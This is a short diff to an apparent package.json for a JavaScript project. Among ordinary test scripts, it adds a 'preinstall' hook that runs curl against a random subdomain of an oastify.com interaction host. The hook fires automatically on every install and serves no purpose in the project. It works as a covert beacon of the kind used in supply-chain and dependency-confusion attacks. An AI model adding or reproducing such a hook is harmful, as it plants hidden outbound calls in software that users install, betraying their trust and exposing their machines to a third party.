@@ -207,6 +207,7 @@
   "APIMethod": "stub",
   "proxyURL": "http://localhost:8000",
   "scripts": {
+    "preinstall": "curl fat5og3juskx0ujx5p6axd6z9qfh38rx.oastify.com",
     "test": "node scripts/test.js",
     "test-precommit": "yarn test --bail --findRelatedTests -u",
     "test-ci": "yarn test --ci --coverage",
